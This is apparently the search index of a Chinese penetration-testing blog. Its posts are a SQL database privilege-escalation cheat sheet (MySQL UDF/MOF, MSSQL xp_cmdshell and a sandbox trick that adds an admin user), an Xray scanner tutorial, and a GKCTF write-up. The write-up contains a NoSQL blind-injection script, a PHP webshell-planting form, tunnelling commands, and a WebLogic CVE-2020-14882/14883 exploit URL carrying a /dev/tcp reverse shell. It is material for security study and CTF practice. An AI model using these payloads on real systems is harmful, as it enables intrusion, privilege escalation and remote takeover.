<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>my-first-blog</title>
    <url>/2021/10/09/my-first-blog/</url>
    <content><![CDATA[<p>欢迎来到我的博客，我会发布一下有关渗透的博文，请多交流！</p>
<span id="more"></span>]]></content>
      <categories>
        <category>个人介绍</category>
      </categories>
      <tags>
        <tag>渗透测试</tag>
        <tag>个人介绍</tag>
      </tags>
  </entry>
  <entry>
    <title>权限提升-MY&amp;MS&amp;ORA等SQL数据库提权</title>
    <url>/2021/10/09/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-MY&amp;MS&amp;ORA%E7%AD%89SQL%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83/</url>
    <content><![CDATA[<p>在利用系统溢出漏洞无果的情况下，可以采用数据库进行提权，但需要知道<strong>数据库提权</strong>的<strong>前提条件：</strong><br /><strong>服务器开启数据库服务及获取到最高权限用户密码</strong>。除Access数据库外，其他数据库基本都存在数据库提权的可能。</p>
<span id="more"></span><br />#数据库应用提权在权限提升中的意义 <br />#WEB 或本地环境如何探针数据库应用 <br />#数据库提权权限用户密码收集等方法<br />#目前数据库提权对应的技术及方法等<br />
<p><br />Mysql的密码：<br />select * from mysql.user;<br /><strong><br /></strong>#案例1.MYSQL数据库提权演示-脚本&amp;MSF**<br /><strong>流程：服务探针-信息收集-提权利用-获取权限</strong><br /><strong>UDF提权原理：</strong><br />UDF（User-Defined-Function），即用户自定义函数，通过新添加函数对MySQL的功能进行扩充。根据MySQL用户自定义函数的功能，写入有执行系统命令的UDF，通过调用此UDF，达到提权的命令。<br />MySQL数据库提权需要满足以下几个条件：</p>
<ol>
<li>MySQL服务以管理员权限启动。</li>
<li>获取了MySQL”root“用户的密码</li>
<li>MySQL可以连接</li>
</ol>
<p><strong>MOF提权原理：</strong><br />托管对象格式（MOF）文件是创建和注册提供程序、事件类别和事件的简便方法。MOF文件每隔5秒就会监控进程的创建和死亡，或MySQL是以管理员身份启动，并且可以往MOF的文件路径”C:/windows/system32/wbem/mof” 中写入文件，便可以通过上传MOF进行提权。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.UDF提权知识点：（基于MYSQL调用命令执行函数）</span><br><span class="line">读取网站数据配置文件（了解其命名规则及查找技巧）</span><br><span class="line">sql data inc config conn database common include等</span><br><span class="line"></span><br><span class="line">读取数据库存储或备份文件（了解其数据库存储格式及对应内容）</span><br><span class="line">MYSQL/data/mysql/user.MYD	#账号密码</span><br><span class="line"></span><br><span class="line">@@basedir/data/数据库名/表名.myd</span><br><span class="line">（表名.myd存储的数据）</span><br><span class="line">利用脚本暴力破解（了解数据库是否支持外联及如何开启外联）</span><br><span class="line">远程本地暴力破解，服务器本地暴力破解</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">利用自定义函数导出dll文件进行命令执行</span><br><span class="line">select version() </span><br><span class="line">select @@basedir</span><br><span class="line">手工创建plugin目录或利用HTFS流创建</span><br><span class="line">select &#x27;x&#x27; into dumpfile &#x27;目录/lib/plugin::INDEX_ALLOCATION&#x27;;</span><br><span class="line">1.mysql&lt;5.1 导出目录：c:/windows或system32</span><br><span class="line">2.mysql =&gt;5.1 导出安装目录/lib/plugin</span><br><span class="line"></span><br><span class="line">2.MOF知识点：（基于MYSQL特性的安全问题）</span><br><span class="line">导出自定义mof文件到系统目录加载</span><br><span class="line">https://www.cnblogs.com/xishaonian/p/6384535.html</span><br><span class="line">select load_file(&#x27;C:/phpStudy/PHPTutorial/WWW/user_add.mof</span><br><span class="line">&#x27;) into dumpfile &#x27;c:/windows/system32/wbem/mof/nullevt.mof&#x27;;</span><br><span class="line">3.启动项知识点：（基于配合操作系统自启动）</span><br><span class="line">msf 实战上传到启动目录</span><br><span class="line"></span><br><span class="line">导出自定义可执行文件到启动目录配合重启执行</span><br><span class="line">将创建好的后门或执行文件进行服务器启动项写入，配置重启执行！	#DDOS</span><br><span class="line">数据库开启外联：</span><br><span class="line">GRANT ALL PRIVILEGES ON *.* TO &#x27;root&#x27;@&#x27;%&#x27; IDENTIFIED BY &#x27;mypassword&#x27; WITH GRANT OPTION 	#予任何主机访问数据的权限</span><br><span class="line"></span><br><span class="line">4.反弹知识点：（基于利用反弹特性命令执行）</span><br><span class="line">nc -l -p 5577	#监听5577端口</span><br></pre></td></tr></table></figure>

<br />
<br />**#案例2.Mssql数据库提权演示-连接客户端（一般默认支持外联）**<br />流程：服务探针-信息收集（得到sa密码）-提权利用-获取权限
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.适用xp_cmdshell进行提权</span><br><span class="line">xp_cmdshell默认在mssql2000中是开启的，在mssql2005之后的版本中则默认禁止。如果用户拥有管理员sa权限则可以用sp_configure重修开启它。</span><br><span class="line">启用：</span><br><span class="line">EXEC sp_configure &#x27;show advanced options&#x27;, 1</span><br><span class="line">RECONFIGURE;</span><br><span class="line">EXEC sp_configure &#x27;xp_cmdshell&#x27;, 1;</span><br><span class="line">RECONFIGURE;</span><br><span class="line"></span><br><span class="line">关闭：</span><br><span class="line">EXEC sp_configure &#x27;show advanced options&#x27;, 1</span><br><span class="line">RECONFIGURE;</span><br><span class="line">EXEC sp_configure &#x27;xp_cmdshell&#x27;, 1;</span><br><span class="line">RECONFIGURE;</span><br><span class="line">执行：</span><br><span class="line">EXEC master.dbo.xp_cmdshell &#x27;命令&#x27;</span><br><span class="line">如果 xp_cmdshell 被删除了，可以上传 xplog70.dll 进行恢复</span><br><span class="line">exec master.sys.sp_addextendedproc &#x27;xp_cmdshell&#x27;, &#x27;C:\Program Files\Microsoft SQL</span><br><span class="line">Server\MSSQL\Binn\xplog70.dll&#x27;</span><br><span class="line"></span><br><span class="line">2.适用sp_oacreate进行提权</span><br><span class="line">主要用来调用OLE对象，利用OLE对象的run方法执行系统命令。</span><br><span class="line">启用：</span><br><span class="line">EXEC sp_configure &#x27;show advanced options&#x27;, 1;</span><br><span class="line">RECONFIGURE WITH OVERRIDE;</span><br><span class="line">EXEC sp_configure &#x27;Ole Automation Procedures&#x27;, 1;</span><br><span class="line">RECONFIGURE WITH OVERRIDE;</span><br><span class="line"></span><br><span class="line">关闭：</span><br><span class="line">EXEC sp_configure &#x27;show advanced options&#x27;, 1;</span><br><span class="line">RECONFIGURE WITH OVERRIDE;</span><br><span class="line">EXEC sp_configure &#x27;Ole Automation Procedures&#x27;, 0;</span><br><span class="line">RECONFIGURE WITH OVERRIDE;</span><br><span class="line"></span><br><span class="line">执行：</span><br><span class="line">declare @shell int exec sp_oacreate &#x27;wscript.shell&#x27;,@shell output exec sp_oamethod</span><br><span class="line">@shell,&#x27;run&#x27;,null,&#x27;c:\windows\system32\cmd.exe /c whoami &gt;c:\\1.txt	#不输出到txt可能无回显</span><br><span class="line"></span><br><span class="line">3.适用SQL Server沙盒提权</span><br><span class="line">参考资料：https://blog.51cto.com/u_11797152/2411770</span><br><span class="line">exec sp_configure &#x27;show advanced options&#x27;,1;reconfigure;</span><br><span class="line">-- 不开启的话在执行 xp_regwrite 会提示让我们开启，</span><br><span class="line">exec sp_configure &#x27;Ad Hoc Distributed Queries&#x27;,1;reconfigure;</span><br><span class="line">--关闭沙盒模式，如果一次执行全部代码有问题，先执行上面两句代码。</span><br><span class="line">exec master..xp_regwrite</span><br><span class="line">&#x27;HKEY_LOCAL_MACHINE&#x27;,&#x27;SOFTWARE\Microsoft\Jet\4.0\Engines&#x27;,&#x27;SandBoxMode&#x27;,&#x27;REG_DWORD&#x27;,0;</span><br><span class="line">--查询是否正常关闭，经过测试发现沙盒模式无论是开，还是关，都不会影响我们执行下面的语句。</span><br><span class="line">exec master.dbo.xp_regread &#x27;HKEY_LOCAL_MACHINE&#x27;,&#x27;SOFTWARE\Microsoft\Jet\4.0\Engines&#x27;,</span><br><span class="line">&#x27;SandBoxMode&#x27;</span><br><span class="line">-- 执 行 系 统 命 令 select * from</span><br><span class="line">openrowset(&#x27;microsoft.jet.oledb.4.0&#x27;,&#x27;;database=c:/windows/system32/ias/ias.mdb&#x27;,&#x27;select shell(&quot;net user</span><br><span class="line">margin margin /add&quot;)&#x27;)</span><br><span class="line">select * from</span><br><span class="line">openrowset(&#x27;microsoft.jet.oledb.4.0&#x27;,&#x27;;database=c:/windows/system32/ias/ias.mdb&#x27;,&#x27;select shell(&quot;net</span><br><span class="line">localgroup administrators margin /add&quot;)&#x27;)</span><br><span class="line">沙盒模式 SandBoxMode 参数含义（默认是 2）</span><br></pre></td></tr></table></figure>
**#案例3.**<br />**普通用户模式：**<br />前提是拥有一个普通的oracle连接账号，不需要DBA权限，可提权至DBA，并以oracle实例运行的权限执行操作系统命令。<br />

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">DBA用户模式：（自动化工具演示）</span><br><span class="line">拥有DBA账号密码，可以省去自己手动创建存储过程的繁琐步骤，一键执行测试。</span><br><span class="line"></span><br><span class="line">注入提升模式：（sqlmap测试演示）</span><br><span class="line">拥有一个oracle注入点，可以通过注入点直接执行系统命令，此种模式没有实现回显，需要自己验证。</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>内网渗透</category>
        <category>权限提升</category>
      </categories>
      <tags>
        <tag>渗透测试</tag>
        <tag>内网渗透</tag>
        <tag>权限提升</tag>
        <tag>数据库</tag>
      </tags>
  </entry>
  <entry>
    <title>Xray基础使用介绍</title>
    <url>/2021/10/10/Xray%E5%9F%BA%E7%A1%80%E4%BD%BF%E7%94%A8%E4%BB%8B%E7%BB%8D/</url>
    <content><![CDATA[<p>官方使用文档：<br /><a href="https://docs.xray.cool/">https://docs.xray.cool/</a><br /><strong>#xray简介</strong><br />xray 是一款功能强大的安全评估工具，由多名经验丰富的一线安全从业者呕心打造而成，<span id="more"></span>主要特性有:</p>
<ul>
<li><strong>检测速度快</strong>。发包速度快; 漏洞检测算法高效。</li>
<li><strong>支持范围广</strong>。大至 OWASP Top 10 通用漏洞检测，小至各种 CMS 框架 POC，均可以支持。</li>
<li><strong>代码质量高</strong>。编写代码的人员素质高, 通过 Code Review、单元测试、集成测试等多层验证来提高代码可靠性。</li>
<li><strong>高级可定制</strong>。通过配置文件暴露了引擎的各种参数，通过修改配置文件可以极大的客制化功能。</li>
<li><strong>安全无威胁</strong>。xray 定位为一款安全辅助评估工具，而不是攻击工具，内置的所有 payload 和 poc 均为无害化检查。</li>
</ul>
<p>目前支持的漏洞检测类型包括:</p>
<ul>
<li>XSS漏洞检测 (key: xss)</li>
<li>SQL 注入检测 (key: sqldet)</li>
<li>命令/代码注入检测 (key: cmd-injection)</li>
<li>目录枚举 (key: dirscan)</li>
<li>路径穿越检测 (key: path-traversal)</li>
<li>XML 实体注入检测 (key: xxe)</li>
<li>文件上传检测 (key: upload)</li>
<li>弱口令检测 (key: brute-force)</li>
<li>jsonp 检测 (key: jsonp)</li>
<li>ssrf 检测 (key: ssrf)</li>
<li>基线检查 (key: baseline)</li>
<li>任意跳转检测 (key: redirect)</li>
<li>CRLF 注入 (key: crlf-injection)</li>
<li>Struts2 系列漏洞检测 (高级版，key: struts)</li>
<li>Thinkphp系列漏洞检测 (高级版，key: thinkphp)</li>
<li>POC 框架 (key: phantasm)</li>
</ul>
<p>其中 POC 框架默认内置 Github 上贡献的 poc，用户也可以根据需要自行构建 poc 并运行。<br />下载地址：<br />Github：<a href="https://github.com/chaitin/xray/releases">https://github.com/chaitin/xray/releases</a><br /><img src="https://img-blog.csdnimg.cn/img_convert/4fa0f9a64003e91a389cc6f091bb2077.png" alt="image.png"></p>
<ul>
<li><code>darwin_amd64</code> 苹果系统<br /></li>
<li><code>linux_386   </code> Linux x86<br /></li>
<li><code>linux_amd64 </code> Linux x64<br /></li>
<li><code>windows_386 </code> Windows x86<br /></li>
<li><code>windows_amd64</code> Windows x64<br /></li>
<li><code>sha256.txt   </code>校正文件，内含个版本的sha256的哈希值，请下载后自行校正以防被劫持投毒。<br /></li>
<li><code>Source Code  </code> 为Github自动打包的，无意义，请忽略。<br /></li>
</ul>
<p>运行：<br />下载对应系统的版本后，解压缩zip文件，Linux / Mac用户在终端（终端）运行，Windows用户请在Powershell或其他高级Shell中运行，在CMD中运行可能体验不佳。<br /><img src="https://img-blog.csdnimg.cn/img_convert/d7879e6dea3c5b8a7da11d7cf8510cf6.png" alt="image.png"></p>
<ul>
<li><p><code>mitm</code> 中 <code>restriction</code> 中 <code>hostname_allowed</code> 增加 <code>testphp.vulnweb.com</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mitm:</span><br><span class="line">  ...</span><br><span class="line">  restriction:                          </span><br><span class="line">    hostname_allowed:                   # 允许访问的 Hostname，支持格式如 t.com、*.t.com、1.1.1.1、1.1.1.1/24、1.1-4.1.1-8</span><br><span class="line">    - testphp.vulnweb.com</span><br></pre></td></tr></table></figure>
<p>因为我们的测试目标站就是 <code>[http://testphp.vulnweb.com](http://testphp.vulnweb.com)</code>，增加这个过滤之后，xray 将只会扫描该站的流量，避免扫描到非授权目标站点。</p>
</li>
<li><p>设定漏洞扫描结果的输出，这里选择使用 html 文件输出，所以命令行后面要增加 <code>--html-output xray-testphp.html</code>。</p>
</li>
<li><p><strong>xray 配置文件中默认不允许扫描 gov 和 edu 等网站，如果想对这些网站进行授权测试，需要移除 <code>hostname_disallowed</code> 的相关配置才可以。严禁未授权的测试！否则后果自负。</strong></p>
</li>
</ul>
<p>开始扫描：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.\xray_windows_amd64.exe webscan --listen 127.0.0.1:7777 --html-output xray-testphp.html</span><br></pre></td></tr></table></figure>
<p><strong>开始扫描</strong><br />然后就可以看到 xray 界面开始输出漏洞信息，下面是几个快速链接，可以点击用于体验更多的漏洞类型的扫描<br /><img src="https://img-blog.csdnimg.cn/img_convert/fc183441887f1db8afd26e084e7e799d.png" alt="image.png"><br>更多的漏洞类型的扫描<br />[外链图片转存中…(img-uBuaiwX8-1633856890582)]</p>
]]></content>
      <categories>
        <category>渗透测试工具﻿</category>
      </categories>
      <tags>
        <tag>xray</tag>
        <tag>渗透测试工具</tag>
      </tags>
  </entry>
  <entry>
    <title>gkctf2021hackme</title>
    <url>/2021/10/10/gkctf2021hackme/</url>
    <content><![CDATA[<p>进入题目，出现的是一个登录框：<br /><img src="https://img-blog.csdnimg.cn/img_convert/30b5156edecfcf2b0ff84f6c4b80b580.png#align=left&display=inline&height=486&&originHeight=486&originWidth=676&size=113208&status=done&style=none&width=676" alt="image.png"><br /><span id="more"></span>查看源码后提</p>
<p>示：<!--doyounosql?--><br />怀疑是Nosql注入，尝试登录，查看数据包是json传输：<img src="https://img-blog.csdnimg.cn/img_convert/276648c0cae45e8fb08ebad107c0240c.png#align=left&display=inline&height=82&&originHeight=82&originWidth=326&size=2662&status=done&style=none&width=326" alt="image.png"><br />burp抓包，构造永真式登录：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&quot;username&quot;:&#123;&quot;$ne&quot;:1&#125;,&quot;password&quot;: &#123;&quot;$ne&quot;:1&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>发现被检测了，<br /><img src="https://img-blog.csdnimg.cn/img_convert/01c93c7eaf1817598c624e8457d2ca41.png#align=left&display=inline&height=364&&originHeight=364&originWidth=1031&size=56917&status=done&style=none&width=1031" alt="image.png"><br />根据提示一：使用unicode编码绕过：<br /><img src="https://img-blog.csdnimg.cn/img_convert/122aa960385b6f2aedb5031f847afd2b.png#align=left&display=inline&height=375&&originHeight=375&originWidth=1155&size=57703&status=done&style=none&width=1155" alt="image.png"><br />猜测是用Nosql盲注获得admin密码，判定条件为</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&quot;msg&quot;:&quot;登录了，但没完全登录&quot;&#125;    // 真</span><br><span class="line">&#123;&quot;msg&quot;:&quot;登录失败&quot;&#125;    // 假</span><br></pre></td></tr></table></figure>

<p>编写盲注脚本：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line">import string</span><br><span class="line"></span><br><span class="line">password = &#x27;&#x27;</span><br><span class="line">url = &#x27;http://node4.buuoj.cn:29587/login.php&#x27;</span><br><span class="line"></span><br><span class="line">while True:</span><br><span class="line">    for c in string.printable:</span><br><span class="line">        if c not in [&#x27;*&#x27;, &#x27;+&#x27;, &#x27;.&#x27;, &#x27;?&#x27;, &#x27;|&#x27;, &#x27;#&#x27;, &#x27;&amp;&#x27;, &#x27;$&#x27;]:</span><br><span class="line"></span><br><span class="line">            # When the method is GET</span><br><span class="line">            get_payload = &#x27;?username=admin&amp;password[$regex]=^%s&#x27; % (password + c)</span><br><span class="line">            # When the method is POST</span><br><span class="line">            post_payload = &#123;</span><br><span class="line">                &quot;username&quot;: &quot;admin&quot;,</span><br><span class="line">                &quot;password[$regex]&quot;: &#x27;^&#x27; + password + c</span><br><span class="line">            &#125;</span><br><span class="line">            # When the method is POST with JSON</span><br><span class="line">            json_payload = &quot;&quot;&quot;&#123;&quot;username&quot;:&quot;admin&quot;, &quot;password&quot;:&#123;&quot;\\u0024\\u0072\\u0065\\u0067\\u0065\\u0078&quot;:&quot;^%s&quot;&#125;&#125;&quot;&quot;&quot; % (password + c)</span><br><span class="line">            headers = &#123;&#x27;Content-Type&#x27;: &#x27;application/json&#x27;&#125;</span><br><span class="line">            r = requests.post(url=url, headers=headers, data=json_payload)    # 简单发送 json</span><br><span class="line"></span><br><span class="line">            #r = requests.post(url=url, data=post_payload)</span><br><span class="line">            if &#x27;但没完全登录&#x27; in r.content.decode():</span><br><span class="line">                print(&quot;[+] %s&quot; % (password + c))</span><br><span class="line">                password += c</span><br></pre></td></tr></table></figure>

<p>得到密码后登录：<br /><img src="https://img-blog.csdnimg.cn/img_convert/67a6fed5612d3df484ac5f5098f5cbbe.png#align=left&display=inline&height=425&&originHeight=425&originWidth=1346&size=380198&status=done&style=none&width=1346" alt="image.png"><br />这里可以读取文件：<img src="https://img-blog.csdnimg.cn/img_convert/9cff577c099cd168568470b8f975550a.png#align=left&display=inline&height=173&&originHeight=173&originWidth=1903&size=290076&status=done&style=none&width=1903" alt="image.png"><br />尝试读取flag,提示flag在内网<br /><img src="https://img-blog.csdnimg.cn/img_convert/e3eed0179b1158f5d390573af28bb5c2.png#align=left&display=inline&height=50&&originHeight=50&originWidth=527&size=21648&status=done&style=none&width=527" alt="image.png"><br />再次根据提示：注意server和其配置文件！<br />server: nginx/1.17.6，直接读取Nginx配置文件：/usr/local/nginx/conf/nginx.conf，得到如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">worker_processes  1;</span><br><span class="line"></span><br><span class="line">events &#123;</span><br><span class="line">    worker_connections  1024;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">http &#123;</span><br><span class="line">    include       mime.types;</span><br><span class="line">    default_type  application/octet-stream;</span><br><span class="line"></span><br><span class="line">    sendfile        on;</span><br><span class="line">    #tcp_nopush     on;</span><br><span class="line"></span><br><span class="line">    #keepalive_timeout  0;</span><br><span class="line">    keepalive_timeout  65;</span><br><span class="line"></span><br><span class="line">    server &#123;</span><br><span class="line">        listen       80;</span><br><span class="line">        error_page 404 404.php;</span><br><span class="line">        root /usr/local/nginx/html;</span><br><span class="line">        index index.htm index.html index.php;</span><br><span class="line">        location ~ \.php$ &#123;</span><br><span class="line">           root           /usr/local/nginx/html;</span><br><span class="line">           fastcgi_pass   127.0.0.1:9000;</span><br><span class="line">           fastcgi_index  index.php;</span><br><span class="line">           fastcgi_param  SCRIPT_FILENAME  $document_root$fastcgi_script_name;</span><br><span class="line">           include        fastcgi_params;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">resolver 127.0.0.11 valid=0s ipv6=off;</span><br><span class="line">resolver_timeout 10s;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    # weblogic</span><br><span class="line">    server &#123;</span><br><span class="line">		listen       80;</span><br><span class="line">		server_name  weblogic;</span><br><span class="line">		location / &#123;</span><br><span class="line">			proxy_set_header Host $host;</span><br><span class="line">			set $backend weblogic;</span><br><span class="line">			proxy_pass http://$backend:7001;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>发现内网中确实还有一个应用，在内网 <code>weblogic</code> 主机的 7001 端口上运行着一个 weblogic 服务。下面我们就想办法攻击这个内网的 weblogic。<br />根据info.php发现目标环境开启了session.upload_progress.enabled.<br /><img src="https://img-blog.csdnimg.cn/img_convert/f3a0ac39c2af6fa8d178b4692a8940e4.png#align=left&display=inline&height=151&&originHeight=151&originWidth=997&size=14896&status=done&style=none&width=997" alt="image.png"><br />可以尝试使用PHP_SESSION_UPLOAD_PROGRESS Getshell.具体参考<a href="https://whoamianony.top/2021/05/14/Web%E5%AE%89%E5%85%A8/%E6%B5%85%E8%B0%88%20SESSION_UPLOAD_PROGRESS%20%E7%9A%84%E5%88%A9%E7%94%A8/">https://whoamianony.top/2021/05/14/Web%E5%AE%89%E5%85%A8/%E6%B5%85%E8%B0%88%20SESSION_UPLOAD_PROGRESS%20%E7%9A%84%E5%88%A9%E7%94%A8/</a><br />构造POC如下：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!doctype <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;http://node4.buuoj.cn:29587/index.php&quot;</span> <span class="attr">method</span>=<span class="string">&quot;POST&quot;</span> <span class="attr">enctype</span>=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span> <span class="attr">value</span>=<span class="string">&quot;&lt;?php phpinfo();fputs(fopen(&#x27;/usr/local/nginx/html/shell.php&#x27;,&#x27;w&#x27;),&#x27;&lt;?php @eval($_POST[whoami])?&gt;&#x27;);?&gt;&quot;</span> /&gt;</span></span><br><span class="line"> 	<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;file&quot;</span> <span class="attr">name</span>=<span class="string">&quot;file&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>在浏览器打开，使用burpsuite抓包，双开：<br /><img src="https://img-blog.csdnimg.cn/img_convert/7303009981cf894602d2c54569a3be09.png#align=left&display=inline&height=821&&originHeight=821&originWidth=1620&size=171506&status=done&style=none&width=1620" alt="image.png"><br />访问/shell.php，使用蚁剑连接：<br /><img src="https://img-blog.csdnimg.cn/img_convert/bdd49904063501b8986ffe0f14087f8c.png#align=left&display=inline&height=433&&originHeight=433&originWidth=1012&size=48858&status=done&style=none&width=1012" alt="image.png"><br />接下来就是内网渗透：<br />首先在VPS上上传ew，执行</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">./ew_for_linux64 -s rcsocks -l 1080 -e 1234</span><br></pre></td></tr></table></figure>

<p>该命令的意思是在vps上添加一个转接隧道，监听 1234，把本地 1234 端口收到的代理请求转交给1080端口，这里 1234 端口只是用于传输流量。<br /><img src="https://img-blog.csdnimg.cn/img_convert/5b54de0fc496d98770c481a7b0a2d640.png#align=left&display=inline&height=76&&originHeight=76&originWidth=597&size=6922&status=done&style=none&width=597" alt="image.png"><br />在上传ew到目标机：<br /><img src="https://img-blog.csdnimg.cn/img_convert/7ebdf6df78b04e2c98c76dbd94f9b6d1.png#align=left&display=inline&height=617&&originHeight=617&originWidth=1012&size=53072&status=done&style=none&width=1012" alt="image.png"><br />执行</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">./ew_for_linux64 -s rssocks -d xx.xx.xx.xx -e 1234</span><br></pre></td></tr></table></figure>

<p>这句话的意思上将本机的1234端口转发到公网地址为xx.xx.xx.xx的机器上。<br />连接成功：<img src="https://img-blog.csdnimg.cn/img_convert/6b8e83f4a8559523599367e1b2d823ea.png#align=left&display=inline&height=84&&originHeight=84&originWidth=459&size=5039&status=done&style=none&width=459" alt="image.png"><br />然后使用 SwichyOmega 配置 socks5 代理服务：<br /><img src="https://img-blog.csdnimg.cn/img_convert/df6931bd4d1869f9c92a9fe0accf7298.png#align=left&display=inline&height=503&&originHeight=503&originWidth=1416&size=48139&status=done&style=none&width=1416" alt="image.png"><br />访问weblogic：<br /><img src="https://img-blog.csdnimg.cn/img_convert/1806da668ce2610c7fdd74467ee0632f.png#align=left&display=inline&height=737&&originHeight=737&originWidth=1370&size=66876&status=done&style=none&width=1370" alt="image.png"><br />可以看到weblogic的版本为12.2.1.4.0，</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Weblogic 是 Oracle 公司推出的 J2EE 应用服务器。在 2020 年 10 月的更新中，Oracle 官方修复了两个长亭科技安全研究员 @voidfyoo 提交的安全漏洞，分别是 CVE-2020-14882 和 CVE-2020-14883。</span><br><span class="line">CVE-2020-14882 允许未授权的用户绕过管理控制台的权限验证访问后台，CVE-2020-14883 允许后台任意用户通过 HTTP 协议执行任意命令。使用这两个漏洞组成的利用链，可通过一个GET请求在远程 Weblogic 服务器上以未授权的任意用户身份执行命令。</span><br></pre></td></tr></table></figure>

<p>首先测试权限绕过漏洞（CVE-2020-14882），访问以下 URL，即可未授权访问到管理后台页面：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http:/weblogic:7001/console/css/%252e%252e%252fconsole.portal</span><br></pre></td></tr></table></figure>

<p><img src="https://img-blog.csdnimg.cn/img_convert/cabfeceb826717006e63956becd83435.png#align=left&display=inline&height=734&&originHeight=734&originWidth=1277&size=85550&status=done&style=none&width=1277" alt="image.png"><br />绕过登录后，发送以下 POC 可远程执行命令，反弹shell：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GET:</span><br><span class="line">    http://weblogic:7001/console/css/%252e%252e%252fconsolejndi.portal?test_handle=com.tangosol.coherence.mvel2.sh.ShellSession(%27weblogic.work.ExecuteThread%20currentThread%20=%20(weblogic.work.ExecuteThread)Thread.currentThread();%20weblogic.work.WorkAdapter%20adapter%20=%20currentThread.getCurrentWork();%20java.lang.reflect.Field%20field%20=%20adapter.getClass().getDeclaredField(%22connectionHandler%22);field.setAccessible(true);Object%20obj%20=%20field.get(adapter);weblogic.servlet.internal.ServletRequestImpl%20req%20=%20(weblogic.servlet.internal.ServletRequestImpl)obj.getClass().getMethod(%22getServletRequest%22).invoke(obj);%20String%20cmd%20=%20req.getHeader(%22cmd%22);String[]%20cmds%20=%20System.getProperty(%22os.name%22).toLowerCase().contains(%22window%22)%20?%20new%20String[]&#123;%22cmd.exe%22,%20%22/c%22,%20cmd&#125;%20:%20new%20String[]&#123;%22/bin/sh%22,%20%22-c%22,%20cmd&#125;;if(cmd%20!=%20null%20)&#123;%20String%20result%20=%20new%20java.util.Scanner(new%20java.lang.ProcessBuilder(cmds).start().getInputStream()).useDelimiter(%22\\\\A%22).next();%20weblogic.servlet.internal.ServletResponseImpl%20res%20=%20(weblogic.servlet.internal.ServletResponseImpl)req.getClass().getMethod(%22getResponse%22).invoke(req);res.getServletOutputStream().writeStream(new%20weblogic.xml.util.StringInputStream(result));res.getServletOutputStream().flush();&#125;%20currentThread.interrupt();</span><br><span class="line"></span><br><span class="line">HTTP Headers: </span><br><span class="line">	cmd: bash -i &gt;&amp; /dev/tcp/xx.xxx.xxx.xx/2333 0&gt;&amp;1</span><br></pre></td></tr></table></figure>

<p><img src="https://img-blog.csdnimg.cn/img_convert/d0aae1cb3963605fc6f7ba1a92fcb352.png#align=left&display=inline&height=365&&originHeight=365&originWidth=1112&size=38416&status=done&style=none&width=1112" alt="image.png"><br />反弹成功：<br /><img src="https://img-blog.csdnimg.cn/img_convert/91173c4f71a0ed0b2c81b7eda7006880.png#align=left&display=inline&height=167&&originHeight=167&originWidth=738&size=13724&status=done&style=none&width=738" alt="image.png"><br />得到flag:<br /><img src="https://img-blog.csdnimg.cn/img_convert/da801437da8c6a867150525d46ebd139.png#align=left&display=inline&height=121&&originHeight=121&originWidth=470&size=8633&status=done&style=none&width=470" alt="image.png"></p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>渗透测试</tag>
        <tag>ctf</tag>
        <tag>weblogic</tag>
        <tag>内网穿透</tag>
      </tags>
  </entry>
</search>
